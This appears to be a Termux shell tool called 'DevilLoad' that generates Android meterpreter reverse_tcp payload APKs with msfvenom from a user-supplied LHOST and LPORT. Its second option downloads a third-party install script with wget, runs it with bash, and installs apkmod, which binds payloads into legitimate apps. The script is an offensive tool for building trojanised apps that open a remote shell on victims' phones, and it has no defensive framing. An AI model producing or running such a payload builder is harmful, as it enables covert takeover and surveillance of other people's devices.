#! /data/data/com.termux/files/usr/bin/bash


#loading
progreSh() {
    LR='\033[1;31m'
    LG='\033[1;32m'
    LY='\033[1;33m'
    LC='\033[1;36m'
    LW='\033[1;37m'
    NC='\033[0m'
    if [ "${1}" = "0" ]; then TME=$(date +"%s"); fi
    SEC=`printf "%04d\n" $(($(date +"%s")-${TME}))`; SEC="$SEC sec"
    PRC=`printf "%.0f" ${1}`
    SHW=`printf "%3d\n" ${PRC}`
    LNE=`printf "%.0f" $((${PRC}/2))`
    LRR=`printf "%.0f" $((${PRC}/2-12))`; if [ ${LRR} -le 0 ]; then LRR=0; fi;
    LYY=`printf "%.0f" $((${PRC}/2-24))`; if [ ${LYY} -le 0 ]; then LYY=0; fi;
    LCC=`printf "%.0f" $((${PRC}/2-36))`; if [ ${LCC} -le 0 ]; then LCC=0; fi;
    LGG=`printf "%.0f" $((${PRC}/2-48))`; if [ ${LGG} -le 0 ]; then LGG=0; fi;
    LRR_=""
    LYY_=""
    LCC_=""
    LGG_=""
    for ((i=1;i<=13;i++))
    do
    	DOTS=""; for ((ii=${i};ii<13;ii++)); do DOTS="${DOTS}."; done
    	if [ ${i} -le ${LNE} ]; then LRR_="${LRR_}#"; else LRR_="${LRR_}."; fi
    	echo -ne "  ${LW}${SEC}  ${LR}${LRR_}${DOTS}${LY}............${LC}............${LG}............ ${SHW}%${NC}\r"
    	if [ ${LNE} -ge 1 ]; then sleep .05; fi
    done
    for ((i=14;i<=25;i++))
    do
    	DOTS=""; for ((ii=${i};ii<25;ii++)); do DOTS="${DOTS}."; done
    	if [ ${i} -le ${LNE} ]; then LYY_="${LYY_}#"; else LYY_="${LYY_}."; fi
    	echo -ne "  ${LW}${SEC}  ${LR}${LRR_}${LY}${LYY_}${DOTS}${LC}............${LG}............ ${SHW}%${NC}\r"
    	if [ ${LNE} -ge 14 ]; then sleep .05; fi
    done
    for ((i=26;i<=37;i++))
    do
    	DOTS=""; for ((ii=${i};ii<37;ii++)); do DOTS="${DOTS}."; done
    	if [ ${i} -le ${LNE} ]; then LCC_="${LCC_}#"; else LCC_="${LCC_}."; fi
    	echo -ne "  ${LW}${SEC}  ${LR}${LRR_}${LY}${LYY_}${LC}${LCC_}${DOTS}${LG}............ ${SHW}%${NC}\r"
    	if [ ${LNE} -ge 26 ]; then sleep .05; fi
    done
    for ((i=38;i<=49;i++))
    do
    	DOTS=""; for ((ii=${i};ii<49;ii++)); do DOTS="${DOTS}."; done
    	if [ ${i} -le ${LNE} ]; then LGG_="${LGG_}#"; else LGG_="${LGG_}."; fi
    	echo -ne "  ${LW}${SEC}  ${LR}${LRR_}${LY}${LYY_}${LC}${LCC_}${LG}${LGG_}${DOTS} ${SHW}%${NC}\r"
    	if [ ${LNE} -ge 38 ]; then sleep .05; fi
    done
}

printf "\n\n\n\n\n\n\n\n\n\n"
progreSh 0
progreSh 50
progreSh 100
printf "\n\n\n\n\n\n\n\n\n\n"  
clear







#requirement
echo -e "\e[36m NOW REQUIREMENTS WILL BE INSTALLED"
sleep 2
pkg install lolcat
pkg install ncurses ncurses-utils
 


#colors
BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"
CYAN="$(printf '\033[36m')"
WHITE="$(printf '\033[37m')"
BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"
GREENBG="$(printf '\033[42m')"
ORANGEBG="$(printf '\033[43m')"
BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"
CYANBG="$(printf '\033[46m')"
WHITEBG="$(printf '\033[47m')"
BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"
clear
echo -e $MAGENTA       "==========================[+]==================================="
echo -e $CYAN             " ____             _ _ _                    _ "
echo -e $CYAN             "|  _ \  _____   _(_) | |    ___   __ _  __| |"
echo -e $CYAN             "| | | |/ _ \ \ / / | | |   / _ \ /    |/    |"
echo -e $CYAN             "| |_| |  __/\ V /| | | |__| (_) | (_| | (_| |"
echo -e $CYAN             "|____/ \___| \_/ |_|_|_____\___/ \__,_|\__,_|"
echo -e $CYAN             "                                             "
echo -e                   "                VERSION : 3.0                 "
echo                    "=========================[+]==================================="
echo
echo -e $CYAN          "............>>> CODED BY : D4RKD3V7L <<<.............."
echo -e $CYAN          "............>>> MODIFIED BY : GUARDIAN <<<.............."
echo 



echo
echo
echo
echo
echo
echo
echo
echo
echo -e "AVAILABLE \e[36mOPTIONS"
echo ""


echo -e "[1]MAKE \e[105m MSF PAYLOAD"
echo ""
echo -e "\e[0m"
echo ""
echo -e "[2]BIND PAYLOAD \e[105m WITH APKMOD"
echo ""
echo -e "\e[0m"

read -p $'\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m \e[1;36m Choose An Option: \e[0m' ch


if [[ $ch -eq '1' || $ch -eq '01' ]];then

echo -e "\e[1;96m"

echo -e [*] "Enter your local IP for LHOST: "
read lh
echo
echo
echo -e [*] "Enter your port numer for LPORT: "
read lport
echo
echo
echo -e [*] "Enter your apk file name here [with extension!!!!!]: "
read apk
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lport R>$apk
echo
echo
echo -e "\e[36m PAYLOAD CREATED CHECK IN YOUR FILE MANAGER"
sleep 5
echo -e  "______________________________________THANKS FOR USING MY TOOL_________________"



elif [[ $ch -eq '2' || $ch -eq '02' ]];then

clear

echo -e "\e[1;94m"

echo -e "\e[1;4mNOW APK MOD WILL BE INSTALLED PLEASE DONT CANCEL THE OPERATION"
sleep 2
wget https://github.com/Hax4us/TermuxBlack/raw/master/install.sh
bash install.sh
clear
pkg install apkmod
sleep 1
clear
echo -e "TO RUN APKMOD \e[46mJUST TYPE apkmod ON YOUR TERMINAL"
echo ""
echo -e "\e[0m"
echo -e $BLACK "______________________________________THANKS FOR USING MY TOOL_________________"
fi
